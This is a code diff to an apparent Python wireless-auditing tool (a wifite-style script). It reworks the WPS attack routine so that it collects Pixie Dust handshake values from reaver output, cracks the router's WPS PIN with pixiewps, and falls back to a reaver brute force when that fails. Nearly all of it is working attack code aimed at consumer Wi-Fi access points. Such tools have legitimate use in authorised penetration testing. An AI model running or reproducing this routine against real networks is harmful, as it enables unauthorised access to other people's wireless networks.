@@ -88,7 +88,7 @@ from subprocess import call
 # GLOBAL VARIABLES IN ALL CAPS #
 ################################
 
-REVISION = 108
+REVISION = 109
 
 
 # WPA variables
@@ -2941,12 +2941,6 @@ def wps_attack(iface, target):
 	EHash2=""
 	AuthKey=""
 	ENonce=""
-	PKEb=""
-	PKRb=""
-	EHash1b=""
-	EHash2b=""
-	AuthKeyb=""
-	ENonceb=""
 	hash_suc = 0
 	locked=""
 	mfr=""
@@ -2956,7 +2950,7 @@ def wps_attack(iface, target):
 	p_out = open(temp + "reaver_out.out", "w")
 	#Run reaver to collect hashes
 	#Report when each hash is found
-	pid = Popen(["reaver", "-i", iface, "-c", target.channel, "-b", target.bssid, "-vv", "-N", "-L", "-a", "-P" ], stdout=p_out).pid
+	pid = Popen(["reaver", "-i", iface, "-c", target.channel, "-b", target.bssid, "-vv", "--no-nacks", "-L", "-a", "-P" ], stdout=p_out).pid
 
 	#print 'Running reaver -i %s -c %s -b %s -vv -N -L -a -P' % (iface, target.channel, target.bssid),
 	p = open(temp + "reaver_out.out")    
@@ -2977,16 +2971,18 @@ def wps_attack(iface, target):
 					locked="1"
 					#Ask what to do here
 
-				if "E-Nonce:" in line and ENonceb == "":                                                                                                     
-					print GR+' [+]'+G+' E-Nonce found            '                                                                                         
-					ENonceb="1"
+				if "E-Nonce:" in line and ENonce == "":                                                                                                     
+					ENonce=line.split(':',1)[1].strip()
+					print GR+' [+]'+G+' E-Nonce found'                                                                                         
 					p_run=p_run+PIXIE_ADD_TO 
-					hash_suc = hash_suc + 1                                     
-				if "PKE:" in line and PKEb == "":
-					print GR+' [+]'+G+' PKE hash found            '
-					PKEb="1"
+					hash_suc = hash_suc + 1
+					#print ENonce
+				if "PKE:" in line and PKE == "":
+					print GR+' [+]'+G+' PKE hash found'
+					PKE=line.split(':',1)[1].strip()
 					p_run=p_run+PIXIE_ADD_TO                                    
-					hash_suc = hash_suc + 1                                       
+					hash_suc = hash_suc + 1
+					#print PKE 
                                 if "WPS Manufacturer" in line and mfr == "":                                   
                                         mfr=line[line.find("Manufacturer:")+14:line.find("\n")] 
 					print GR+' [+]'+G+' Manufacturer: '+W+' %s ' % (mfr)    
@@ -2996,22 +2992,25 @@ def wps_attack(iface, target):
                                 if "WPS Model Serial Number" in line and serial == "":                               
                                         serial=line[line.find("Serial Number:")+15:line.find("\n")]
 					print GR+' [+]'+G+' Serial: '+W+' %s ' % (serial)
-       			        if "PKR:" in line and PKRb == "":                 
+       			        if "PKR:" in line and PKR == "":                 
        		        	        print GR+' [+]'+G+' PKR hash found            '     
-       	 	            		PKRb="1"  
+					PKR=line.split(':',1)[1].strip()
 					p_run=p_run+PIXIE_ADD_TO                                      
-					hash_suc = hash_suc + 1                                     
-				if "AuthKey:" in line and AuthKeyb == "":
+					hash_suc = hash_suc + 1
+					#print PKR
+				if "AuthKey:" in line and AuthKey == "":
 					print GR+' [+]'+G+' Authkey found            '
-					AuthKeyb="1"
+					AuthKey=line.split(':',1)[1].strip()
 					p_run=p_run+PIXIE_ADD_TO                                      
-					hash_suc = hash_suc + 1                                     
-				if "E-Hash1" in line and EHash1b == "":
+					hash_suc = hash_suc + 1
+					#print AuthKey
+				if "E-Hash1" in line and EHash1 == "":
 					print GR+' [+]'+G+' E-Hash1 found            '
-					EHash1b="1"
+					EHash1=line.split(':',1)[1].strip()
 					p_run=p_run+PIXIE_ADD_TO                                      
 					hash_suc = hash_suc + 1                                     
 				if "E-Hash2" in line:
+					EHash2=line.split(':',1)[1].strip()
 					os.kill(pid, signal.SIGQUIT)
 					print GR+' [+]'+G+' E-Hash2 found            '
 					pixie = True
@@ -3048,27 +3047,6 @@ def wps_attack(iface, target):
 	if pixie == True:
 		print GR+' [+]'+G+' Cracking using pixiewps...'
 
-		p = open(temp + "reaver_out.out")
-		line="s"
-		p.seek(0)
-		while line:
- 
-		    line = p.readline()
-		    if "PKE:" in line:PKE=line
-		    if "PKR:" in line:PKR=line
-		    if "E-Hash1" in line:EHash1=line
-		    if "E-Hash2" in line:EHash2=line
-		    if "AuthKey" in line:AuthKey=line
-		    if "E-Nonce" in line:ENonce=line
-		p.close()
-
-		ENonce= ENonce.split(':',1)[1].rstrip()
-		PKE=PKE.split(':',1)[1].rstrip()
-		PKR=PKR.split(':',1)[1].rstrip()
-		EHash1=EHash1.split(':',1)[1].rstrip()
-		EHash2=EHash2.split(':',1)[1].rstrip()
-		AuthKey=AuthKey.split(':',1)[1].rstrip()
-
 		fin2 = open(temp + "fPixiewpsIn.txt", "w")
 		fout2 = open(temp + "fPixiewpsOut.txt", "w")
 		ferr2 = open(temp + "fPixiewpsErrors.txt", "w")
@@ -3076,6 +3054,13 @@ def wps_attack(iface, target):
 		#Stuff the hashes into pixiewps	
 
 		runpixie=Popen(["pixiewps", "-e", PKE, "-r", PKR, "-s", EHash1, "-z", EHash2, "-a", AuthKey, "-n", ENonce ],stdin=fin2, stdout=fout2, stderr=ferr2)
+		#runpixie=Popen(["pixiewps", 
+		#			"-n",ENonce, 
+		#			"-e",PKE, 
+		#			"-s",EHash1, 
+		#			"-z",EHash2, 
+		#			"-a",AuthKey, 
+		#			"-r",PKR ])
 		#print 'pixiewps  -e %s -r %s -s %s -z %s -a %s -n %s' % (PKE, PKR, EHash1, EHash2, AuthKey, ENonce)
 		Popen.wait(runpixie)
 		f = open(temp + 'fPixiewpsOut.txt')
@@ -3095,8 +3080,9 @@ def wps_attack(iface, target):
 		os.remove(temp + "fPixiewpsErrors.txt")
 		os.remove(temp + "fPixiewpsIn.txt")
 		os.remove(temp + "fPixiewpsOut.txt")	
-
+	#print WPSpin ##AA
 	if WPSpin=="WPS pin not found!" or WPSpin=="":	#Crap, timed out or didn't work. Run a regular reaver brute-force
+
 		print GR+'\n [+]'+G+' Pixiewps attack failed!'
 		pixie_fail=True
 		cmd = ['reaver',
@@ -3108,7 +3094,8 @@ def wps_attack(iface, target):
 		        '-vv']  # verbose output
 		
 	else:
-		WPSpin=WPSpin[WPSpin.find("WPS pin")+9:WPSpin.find("\n")]	#pixiewps found a pin, let's see if it works! Have to remove the -a flag, or it hangs. 
+		WPSpin=WPSpin.split(':',1)[1].strip()
+		#WPSpin=WPSpin[WPSpin.find("WPS pin")+9:WPSpin.find("\n")]	#pixiewps found a pin, let's see if it works! Have to remove the -a flag, or it hangs. 
 		print GR+'\n [+]'+G+' PIN found:     %s' % (C+WPSpin+W)
 		if PIXIE_NOPSK == False:print GR+' [+]'+G+' Handing pin to reaver'
 	cmd = ['reaver',
